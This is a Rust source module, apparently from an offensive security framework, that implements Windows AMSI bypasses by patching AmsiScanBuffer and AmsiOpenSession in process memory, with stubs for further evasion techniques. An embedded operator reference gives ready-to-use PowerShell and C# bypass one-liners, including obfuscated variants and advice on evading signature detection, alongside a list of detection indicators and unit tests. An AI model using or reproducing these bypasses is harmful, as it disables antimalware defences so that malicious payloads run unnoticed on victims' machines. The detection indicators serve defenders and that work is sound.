//! AMSI (Anti-Malware Scan Interface) Bypass Module
//!
//! Provides multiple techniques to bypass Windows AMSI for payload execution.
//! MITRE ATT&CK: T1562.001 (Disable or Modify Tools)
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
//! All techniques require explicit authorization for deployment.
//!
//! Techniques implemented:
//! - PatchScanBuffer: Patch AmsiScanBuffer to return clean result
//! - PatchOpenSession: Patch AmsiOpenSession to fail initialization
//! - PatchInitFailed: Set amsiInitFailed flag to true
//!
//! Reference: https://attack.mitre.org/techniques/T1562/001/

use super::windows_internals::{PatchInfo, WinError, WinResult};
#[cfg(all(windows, feature = "opsec-windows"))]
use super::windows_internals::patches;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// AMSI Bypass techniques available
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[derive(Default)]
pub enum AmsiBypassTechnique {
    /// Patch AmsiScanBuffer to return clean result (most reliable)
    #[default]
    PatchScanBuffer,
    /// Patch AmsiOpenSession to fail session initialization
    PatchOpenSession,
    /// Patch amsiInitFailed flag to true
    PatchInitFailed,
    /// Use hardware breakpoints (DR registers) - advanced
    HardwareBreakpoint,
    /// Unhook ntdll.dll from EDR hooks
    NtdllUnhook,
    /// Force amsi.dll unload from process
    ForceUnload,
}


impl AmsiBypassTechnique {
    /// Get MITRE ATT&CK technique ID
    pub fn mitre_id(&self) -> &'static str {
        "T1562.001"
    }

    /// Get technique description
    pub fn description(&self) -> &'static str {
        match self {
            Self::PatchScanBuffer => "Patch AmsiScanBuffer to return E_INVALIDARG (clean)",
            Self::PatchOpenSession => "Patch AmsiOpenSession to fail initialization",
            Self::PatchInitFailed => "Set internal amsiInitFailed flag to true",
            Self::HardwareBreakpoint => "Use DR registers to intercept AMSI calls",
            Self::NtdllUnhook => "Reload clean ntdll.dll to remove EDR hooks",
            Self::ForceUnload => "Force unload amsi.dll from process memory",
        }
    }

    /// Get reliability score (1-10)
    pub fn reliability(&self) -> u8 {
        match self {
            Self::PatchScanBuffer => 9,
            Self::PatchOpenSession => 8,
            Self::PatchInitFailed => 7,
            Self::HardwareBreakpoint => 6,
            Self::NtdllUnhook => 5,
            Self::ForceUnload => 4,
        }
    }

    /// Get detection risk score (1-10, higher = more detectable)
    pub fn detection_risk(&self) -> u8 {
        match self {
            Self::PatchScanBuffer => 6,
            Self::PatchOpenSession => 5,
            Self::PatchInitFailed => 4,
            Self::HardwareBreakpoint => 3,
            Self::NtdllUnhook => 7,
            Self::ForceUnload => 8,
        }
    }
}

/// AMSI Bypass result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AmsiBypassResult {
    /// Whether the bypass was successful
    pub success: bool,
    /// Technique that was used
    pub technique: AmsiBypassTechnique,
    /// Result message
    pub message: String,
    /// Address that was patched (if applicable)
    pub patched_address: Option<String>,
    /// Original bytes (for restoration)
    #[serde(skip)]
    pub patch_info: Option<PatchInfo>,
}

/// AMSI Bypass Engine
#[derive(Debug, Clone)]
pub struct AmsiBypass {
    /// Primary technique to use
    technique: AmsiBypassTechnique,
    /// Enable fallback to other techniques if primary fails
    fallback_enabled: bool,
    /// Verify bypass after patching
    verify_after_patch: bool,
    /// Store patches for potential restoration
    patches: HashMap<AmsiBypassTechnique, PatchInfo>,
}

impl Default for AmsiBypass {
    fn default() -> Self {
        Self {
            technique: AmsiBypassTechnique::PatchScanBuffer,
            fallback_enabled: true,
            verify_after_patch: true,
            patches: HashMap::new(),
        }
    }
}

impl AmsiBypass {
    /// Create new AMSI Bypass with specific technique
    pub fn new(technique: AmsiBypassTechnique) -> Self {
        Self {
            technique,
            fallback_enabled: true,
            verify_after_patch: true,
            patches: HashMap::new(),
        }
    }

    /// Enable/disable fallback to other techniques
    pub fn with_fallback(mut self, enabled: bool) -> Self {
        self.fallback_enabled = enabled;
        self
    }

    /// Enable/disable verification after patching
    pub fn with_verification(mut self, enabled: bool) -> Self {
        self.verify_after_patch = enabled;
        self
    }

    /// Get current technique
    pub fn technique(&self) -> AmsiBypassTechnique {
        self.technique
    }

    /// Execute AMSI bypass with selected technique
    pub fn execute(&mut self) -> AmsiBypassResult {
        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            let result = match self.technique {
                AmsiBypassTechnique::PatchScanBuffer => self.patch_scan_buffer(),
                AmsiBypassTechnique::PatchOpenSession => self.patch_open_session(),
                AmsiBypassTechnique::PatchInitFailed => self.patch_init_failed(),
                AmsiBypassTechnique::HardwareBreakpoint => self.hardware_breakpoint_bypass(),
                AmsiBypassTechnique::NtdllUnhook => self.unhook_ntdll(),
                AmsiBypassTechnique::ForceUnload => self.force_unload(),
            };

            match result {
                Ok(res) => res,
                Err(e) if self.fallback_enabled => self.try_fallback(e),
                Err(e) => AmsiBypassResult {
                    success: false,
                    technique: self.technique,
                    message: format!("AMSI bypass failed: {}", e),
                    patched_address: None,
                    patch_info: None,
                },
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        {
            AmsiBypassResult {
                success: false,
                technique: self.technique,
                message: "AMSI bypass requires Windows with opsec-windows feature".to_string(),
                patched_address: None,
                patch_info: None,
            }
        }
    }

    /// Auto-select best technique based on environment
    pub fn auto_bypass(&mut self) -> AmsiBypassResult {
        let techniques = [
            AmsiBypassTechnique::PatchScanBuffer,
            AmsiBypassTechnique::PatchInitFailed,
            AmsiBypassTechnique::PatchOpenSession,
        ];

        for technique in techniques {
            self.technique = technique;
            let result = self.execute();
            if result.success {
                return result;
            }
        }

        AmsiBypassResult {
            success: false,
            technique: self.technique,
            message: "All AMSI bypass techniques failed".to_string(),
            patched_address: None,
            patch_info: None,
        }
    }

    /// Restore original AMSI functionality
    pub fn restore(&mut self) -> WinResult<()> {
        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::restore_memory;

            for (_technique, patch_info) in self.patches.drain() {
                restore_memory(&patch_info)?;
            }
            Ok(())
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        {
            Ok(())
        }
    }

    /// Check if AMSI is currently bypassed
    pub fn is_bypassed(&self) -> bool {
        !self.patches.is_empty()
    }

    /// Get list of applied patches
    pub fn applied_patches(&self) -> Vec<AmsiBypassTechnique> {
        self.patches.keys().copied().collect()
    }

    // ========== Private Implementation ==========

    #[cfg(all(windows, feature = "opsec-windows"))]
    fn patch_scan_buffer(&mut self) -> WinResult<AmsiBypassResult> {
        use super::windows_internals::{get_function_address, get_module_handle, write_memory};

        let amsi_module = get_module_handle("amsi.dll")?;
        let scan_buffer_addr = get_function_address(amsi_module, "AmsiScanBuffer")?;

        let patch_info = write_memory(scan_buffer_addr as *mut u8, &patches::RET_INVALIDARG)?;
        let addr_str = format!("{:p}", scan_buffer_addr);

        self.patches
            .insert(AmsiBypassTechnique::PatchScanBuffer, patch_info.clone());

        Ok(AmsiBypassResult {
            success: true,
            technique: AmsiBypassTechnique::PatchScanBuffer,
            message: "AmsiScanBuffer patched successfully".to_string(),
            patched_address: Some(addr_str),
            patch_info: Some(patch_info),
        })
    }

    #[cfg(all(windows, feature = "opsec-windows"))]
    fn patch_open_session(&mut self) -> WinResult<AmsiBypassResult> {
        use super::windows_internals::{get_function_address, get_module_handle, write_memory};

        let amsi_module = get_module_handle("amsi.dll")?;
        let open_session_addr = get_function_address(amsi_module, "AmsiOpenSession")?;

        // Return 0 = fail session open
        let patch_info = write_memory(open_session_addr as *mut u8, &patches::RET_ZERO)?;
        let addr_str = format!("{:p}", open_session_addr);

        self.patches
            .insert(AmsiBypassTechnique::PatchOpenSession, patch_info.clone());

        Ok(AmsiBypassResult {
            success: true,
            technique: AmsiBypassTechnique::PatchOpenSession,
            message: "AmsiOpenSession patched successfully".to_string(),
            patched_address: Some(addr_str),
            patch_info: Some(patch_info),
        })
    }

    #[cfg(all(windows, feature = "opsec-windows"))]
    fn patch_init_failed(&mut self) -> WinResult<AmsiBypassResult> {
        // This technique patches the amsiInitFailed global variable
        // Finding this requires pattern scanning which is more complex
        // For now, return a placeholder result

        Ok(AmsiBypassResult {
            success: false,
            technique: AmsiBypassTechnique::PatchInitFailed,
            message: "amsiInitFailed patch requires pattern scanning (not yet implemented)"
                .to_string(),
            patched_address: None,
            patch_info: None,
        })
    }

    #[cfg(all(windows, feature = "opsec-windows"))]
    fn hardware_breakpoint_bypass(&self) -> WinResult<AmsiBypassResult> {
        // Hardware breakpoint bypass uses DR0-DR3 registers
        // This is a more advanced technique that requires thread context manipulation

        Ok(AmsiBypassResult {
            success: false,
            technique: AmsiBypassTechnique::HardwareBreakpoint,
            message: "Hardware breakpoint bypass not yet implemented".to_string(),
            patched_address: None,
            patch_info: None,
        })
    }

    #[cfg(all(windows, feature = "opsec-windows"))]
    fn unhook_ntdll(&self) -> WinResult<AmsiBypassResult> {
        // Reload clean ntdll.dll from disk to remove EDR hooks
        // This requires reading the file and remapping sections

        Ok(AmsiBypassResult {
            success: false,
            technique: AmsiBypassTechnique::NtdllUnhook,
            message: "NTDLL unhook not yet implemented".to_string(),
            patched_address: None,
            patch_info: None,
        })
    }

    #[cfg(all(windows, feature = "opsec-windows"))]
    fn force_unload(&self) -> WinResult<AmsiBypassResult> {
        // Force unload amsi.dll - risky and may cause instability

        Ok(AmsiBypassResult {
            success: false,
            technique: AmsiBypassTechnique::ForceUnload,
            message: "Force unload not yet implemented (high risk)".to_string(),
            patched_address: None,
            patch_info: None,
        })
    }

    fn try_fallback(&mut self, _original_error: WinError) -> AmsiBypassResult {
        // Try other techniques as fallback
        self.auto_bypass()
    }
}

// ============================================================================
// Reference Information
// ============================================================================

/// AMSI bypass reference information for operators
pub struct AmsiReference;

impl AmsiReference {
    /// Get PowerShell bypass reference
    pub fn powershell_bypass() -> &'static str {
        r#"=== PowerShell AMSI Bypass Reference ===
MITRE ATT&CK: T1562.001

TECHNIQUE 1 - Reflection Method:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

TECHNIQUE 2 - Memory Patching (Matt Graeber):
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

TECHNIQUE 3 - String Obfuscation:
$a = 'System.Management.Automation.A]'+'msi'+'Utils'
$b = 'amsiInitFailed'
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)

DETECTION NOTES:
- Event ID 4104 (Script Block Logging) may capture bypass attempts
- Defender may detect known bypass strings
- Use obfuscation to evade signature detection
"#
    }

    /// Get .NET bypass reference
    pub fn dotnet_bypass() -> &'static str {
        r#"=== .NET AMSI Bypass Reference ===
MITRE ATT&CK: T1562.001

C# REFLECTION BYPASS:
var amsi = typeof(System.Management.Automation.AmsiUtils);
var field = amsi.GetField("amsiInitFailed",
    System.Reflection.BindingFlags.NonPublic |
    System.Reflection.BindingFlags.Static);
field.SetValue(null, true);

NOTES:
- Works in PowerShell hosted in .NET applications
- May be blocked by Constrained Language Mode
- Consider using P/Invoke for direct patching
"#
    }

    /// Get detection indicators
    pub fn detection_indicators() -> &'static str {
        r#"=== AMSI Bypass Detection Indicators ===

WINDOWS DEFENDER ALERTS:
- Behavior:Win32/AmsiTamper.A
- Behavior:Win32/AmsiTamper.B
- HackTool:PowerShell/AmsiBypass

EVENT LOG INDICATORS:
- Event ID 4104: Script block containing 'AmsiUtils', 'amsiInitFailed'
- Event ID 4103: Module logging for suspicious assemblies
- Windows Defender operational log: AMSI scan failures

MEMORY INDICATORS:
- Modified bytes at AmsiScanBuffer entry point
- Unexpected memory protection changes in amsi.dll
- Missing or corrupted AMSI provider registrations

BEHAVIORAL INDICATORS:
- PowerShell execution without AMSI events
- Successful execution of known-malicious scripts
- Repeated AMSI initialization failures
"#
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_amsi_bypass_creation() {
        let bypass = AmsiBypass::default();
        assert_eq!(bypass.technique, AmsiBypassTechnique::PatchScanBuffer);
        assert!(bypass.fallback_enabled);
        assert!(bypass.verify_after_patch);
    }

    #[test]
    fn test_amsi_bypass_with_options() {
        let bypass = AmsiBypass::new(AmsiBypassTechnique::PatchOpenSession)
            .with_fallback(false)
            .with_verification(true);

        assert_eq!(bypass.technique, AmsiBypassTechnique::PatchOpenSession);
        assert!(!bypass.fallback_enabled);
        assert!(bypass.verify_after_patch);
    }

    #[test]
    fn test_technique_metadata() {
        let technique = AmsiBypassTechnique::PatchScanBuffer;
        assert_eq!(technique.mitre_id(), "T1562.001");
        assert!(technique.reliability() > 0);
        assert!(technique.detection_risk() > 0);
    }

    #[test]
    #[cfg(not(windows))]
    fn test_amsi_bypass_non_windows() {
        let mut bypass = AmsiBypass::default();
        let result = bypass.execute();
        assert!(!result.success);
        assert!(result.message.contains("Windows"));
    }

    #[test]
    fn test_amsi_reference() {
        let ps_ref = AmsiReference::powershell_bypass();
        assert!(ps_ref.contains("AmsiUtils"));

        let detection = AmsiReference::detection_indicators();
        assert!(detection.contains("AmsiTamper"));
    }

    #[test]
    fn test_bypass_result_serialization() {
        let result = AmsiBypassResult {
            success: true,
            technique: AmsiBypassTechnique::PatchScanBuffer,
            message: "Test".to_string(),
            patched_address: Some("0x12345678".to_string()),
            patch_info: None,
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("PatchScanBuffer"));
        assert!(json.contains("true"));
    }
}
